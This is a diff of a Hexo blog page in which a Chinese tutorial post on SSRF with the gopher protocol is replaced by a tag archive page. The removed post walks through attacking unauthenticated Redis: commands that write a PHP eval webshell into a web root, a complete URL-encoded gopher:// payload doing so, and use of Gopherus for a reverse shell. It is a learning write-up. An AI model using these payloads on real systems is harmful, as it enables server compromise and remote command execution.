@@ -8,7 +8,7 @@
     <meta http-equiv="Cache-Control" content="no-siteapp">
     <title>
         
-            初探ssrfgopher协议
+            标签 - burp使用
         
     </title>
     <link rel="shortcut icon" href="#"/>
@@ -31,36 +31,15 @@
 <meta name="generator" content="Hexo 6.3.0"></head>
 <body>
     <a id="cover"></a>
-    <link type="text/css" rel="stylesheet" href="/css/post.css">
+    <link type="text/css" rel="stylesheet" href="/css/archive.css">
 <div id="header" class="header">
     <div class="vertical">
         <div class="inner">
             
-                <h1 class="header-subtitle">初探ssrfgopher协议</h1>
+                <h1 class="header-subtitle">标签归档</h1>
                 <div class="header-subinfo">
-                    <p class="article-info-text">
-                        <span>
-                            <i class="iconfont icon-time"></i> 发表时间：2023-02-22
-                        </span>
-                        
-                            <span id="/2023/02/22/初探ssrfgopher协议/" class="leancloud_visitors" data-flag-title="初探ssrfgopher协议">
-                                <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                            </span>
-                        
-                        <span>
-                            <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/02/22/初探ssrfgopher协议/"></span>
-                        </span>  
-                    </p>
-                    
-                        
-                            <span class="category-color">ssrf</span>
-                        
-                    
-                    
-                        
-                            <span class="tag-color">ssrf</span>
-                        
-                    
+                    <p class="article-info-text Chinese"></p>
+                    <p class="article-info-text English"></p>                  
                 </div>
             
         </div>
@@ -69,90 +48,37 @@
 </div>
 <div id="container">
     
-        <!-- 文章页面 -->
-        <div id="article">
-            <div class="toc"></div>
-            <div class="article-body">
-                <p>我们先开始介绍下我们这篇文章的主角，gopher协议。<br>Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。随着HTTP协议的壮大，Gopher协议已经慢慢的淡出了我们的视线，但是Gopher协议很多组件都支持并且可以做很多事，在SSRF中，Gopher协议<br>可以对FTP、Telnet、Redis、Memcache、mysql进行攻击,也可以发送GET、POST 请求。</p>
-<p>那么Gopher协议需要如何构造妮？<br>其实这个协议和http协议很类似，只不过gopher协议没有默认端口，需要特殊指定，而且需要指定POST方法，回车换行需要使用%0d%0a,而且POST参数之间的&amp;分隔符也需要URL编码</p>
-<p>我们来看看Gopher协议的基本协议格式<br><code>gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;</code>_后接TCP数据流</p>
-<p>那么我们试试看Gopher协议最经典的攻击方式，很多服务默认都不会在公网开启，一般都是仅仅允许本地访问，例如Redis，Redis因为配置不当会造成未授权访问，攻击者可以读取敏感信息，写入文件</p>
-<p>因为gopher协议传参方式是TCP数据流，那么我们可以尝试使用tcpdump或者直接使用Wireshark进行捕捉TCP的传输。</p>
-<p>我们现在攻击机上安装一个redis 【安装方法有很多，可以用wget安装，也可以用apt-get安装】【可以参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/langtianya/p/5187681.html%E3%80%91%E6%88%91%E5%9B%A0%E4%B8%BA%E6%98%AFKali%E7%9B%B4%E6%8E%A5apt-get%E6%90%9E%E5%AE%9A%E7%9A%84%E3%80%82">https://www.cnblogs.com/langtianya/p/5187681.html】我因为是Kali直接apt-get搞定的。</a> 按照这个网站一步一步来总会搞定的，不要自己瞎搞了，我走了好多弯路。</p>
-<p>安装成功之后就会开心的出现一个立方体的页面<br><img src="/image/picture/1.png" alt="这是图片" title="Magic Gardens"></p>
-<p>然后我们再开一个窗口，输入<code>redis-cli</code> [进入redis的终端]，然后输出ping 如果返回PONG 那么就是成功了</p>
-<p><img src="/image/picture/2.png" alt="这是图片" title="Magic Gardens"></p>
-<p>然后我们再进行一些Redis未授权访问的攻击，其中危害最大的莫过于是直接写入Webshell和利用计划任务执行命令反弹shell，这个命令一般Centos容易复现。我们打开我们的抓包工具。<br>我这里用Wireshark吧。我们先让他去抓lo这个网卡</p>
-<p><img src="/image/picture/3.png" alt="这是图片" title="Magic Gardens"></p>
-<p>然后去执行Redis的恶意语句。</p>
-<p>1.<code>config set dir /home/wwwroot/default/</code><br>2.<code>config set dbfilename &quot;shell.php&quot;</code><br>3.<code>set gaia &quot;&lt;?php eval($_POST[a]);?&gt;&quot;</code><br>4.<code>save</code><br>5.<code>exit</code></p>
-<p>&#x2F;home&#x2F;wwwroot&#x2F;default是网站的根目录，这个可以根据网页报错找到，也可以使用file:&#x2F;&#x2F;&#x2F;协议去读取敏感文件去获取网站根目录。[如果第一条执行不了，可能是你的攻击机器没有这个目录，创建一下就行]</p>
-<p>成功写入了webshell<br>然后我们执行完之后妮<br>打开Wireshark然后右键追踪流里面，有个TCP流，里面感觉有很多数据，不要害怕，记得去选中我们发送过去的数据【因为我们Redis有数据回显】</p>
-<p><img src="/image/picture/4.png" alt="这是图片" title="Magic Gardens"></p>
-<p>然后将获得的数据复制下来</p>
-<p>然后对这个数据进行处理。先进行一次URL编码[<a target="_blank" rel="noopener" href="http://tool.oschina.net/encode?type=4%5D%EF%BC%8C%E7%84%B6%E5%90%8E%E5%B0%86%E6%AF%8F%E4%B8%80%E4%B8%AA%E6%8D%A2%E8%A1%8C%E7%94%A8%0D%0A%E4%BB%A3%E6%9B%BF%E8%BD%AC%E7%A0%81%E5%87%BA%E6%9D%A5%E7%9A%84%0A,%E8%AE%B0%E5%BE%97%E8%A6%81%E6%8A%8A?%E6%9B%BF%E6%8D%A2%E4%B8%BA?">http://tool.oschina.net/encode?type=4]，然后将每一个换行用%0d%0a代替转码出来的%0a,记得要把?替换为%3f</a> 然后我们将这个东西再加上gopher的前缀进行执行。<br><code>gopher://127.0.0.1:6379/*1%0D%0A$7%0D%0ACOMMAND%0D%0A*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$3%0D%0Adir%0D%0A$22%0D%0A/home/wwwroot/default/%0D%0A*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$10%0D%0Adbfilename%0D%0A$9%0D%0Ashell.php%0D%0A*3%0D%0A$3%0D%0Aset%0D%0A$4%0D%0Agaia%0D%0A$24%0D%0A%3C%3fphp%20eval($_POST%5Ba%5D);%3f%3E%0D%0A*1%0D%0A$4%0D%0Asave%0D%0A</code></p>
-<p>然后把这段poc复制袭来 打开浏览器把他以参数的形式上传到测试的网站然后执行，就会生成shell.php<br>感觉十分麻烦，别人也感觉麻烦<br>有前辈已经写过了工具很简单可以直接拿来使用<br>gopherus.py,在github可以下载。[这个工具支持多种Gopher协议生成攻击代码]<br>下载好后直接使用</p>
-<p>我们选中redis模块[python gopherus.py –exploit redis]<br>然后很贴心的问我要webshell还是反弹shell，然后让我们写接受反弹shell的Ip<br>虽然最后出了点小问题，但是他有显示了POC代码，直接复制粘贴就行，这里监听的是1234端口。<br>那我们监听1234端口吧<br>之后就会成功获得反弹shell<br>很多非加密访问的未授权访问都可以尝试使用Gopher协议去尝试利用!</p>
-
-                
-                <p class="end">__END__</p>
-            </div>
-            <div class="article-footer">
-                <div class="suffix-box">
-    <div class="suffix-box-left">
-        <img src="/image/sidebar/touxiang.jpg" alt="章鱼海绵">
-    </div>
-    <div class="suffix-box-right">
-        <span class="suffix-box-title">文章作者：</span>章鱼海绵
-        <br>
-        <span class="suffix-box-title">文章出处：</span><a href="/2023/02/22/%E5%88%9D%E6%8E%A2ssrfgopher%E5%8D%8F%E8%AE%AE/" target="_blank">初探ssrfgopher协议</a>
-        <br>
-        <span class="suffix-box-title">作者签名：</span>简单地活着, 肆意又精彩.
-        <br>
-        <span class="suffix-box-title">关于主题：</span><a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
-        <br>
-        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
-        <br>
-    </div>
-    <div style="clear: both;"></div>
-</div>
-                
-                    <div class="category">
-                        分类：
+        
+            <!-- 归档页面、分类归档页面、标签归档页面 -->
+            <div class="articles">
+                <div class="articles-wrap">
+                    <span class="archive-move-on"></span>
+                    <span class="archive-counter">
                         
-                            <a href="/categories/ssrf/">ssrf</a>
+                            当前标签：<span class="tag">burp使用</span>
                         
-                    </div>
-                
-                
-                    <div class="tag">
-                        标签：
-                        
-                            <a href="/tags/ssrf/">ssrf</a>
-                        
-                    </div>
-                
-                <div class="article-prev-next">
-                    
-                        <a href="/2023/02/23/python%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E5%B0%8F%E8%AE%A1/" class="prev-prefix">« </a> 上一篇：    <a href="/2023/02/23/python%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E5%B0%8F%E8%AE%A1/" title="发布于 2023-02-23 09:37">python脚本编写小计</a>
-                        <br>
+                    </span>
                     
                     
-                        <a href="/2023/02/10/%E7%AB%A0%E9%B1%BC%E6%B5%B7%E7%BB%B5/" class="next-prefix">» </a> 下一篇：    <a href="/2023/02/10/%E7%AB%A0%E9%B1%BC%E6%B5%B7%E7%BB%B5/" title="发布于 2023-02-10 01:39">章鱼海绵</a>
+                        
+                            <div class="archive-title">
+                                <h2 class="archive-year">2023</h2>
+                            </div>
+                            
+                           
+                        <div class="article">
+                            <div class="article-header">
+                                <h1 class="article-title"><a href="/2023/03/04/burp%E5%AE%8F%E5%AE%9A%E4%B9%89%E7%BB%95%E8%BF%87%E7%88%86%E7%A0%B4/"><span>burp宏定义绕过爆破</span></a></h1>
+                                <div class="article-meta">
+                                    <span class="article-time">03-04</span>
+                                </div>
+                            </div>
+                        </div>
                     
                 </div>
             </div>
             
-    <div class="article-comments">
         
-            <div class="comments-title">
-                评论列表
-            </div>
-        
-        <div class="comments-content"></div>
-    </div>
-
-        </div>
     
 </div>
     <div id="footer"></div>
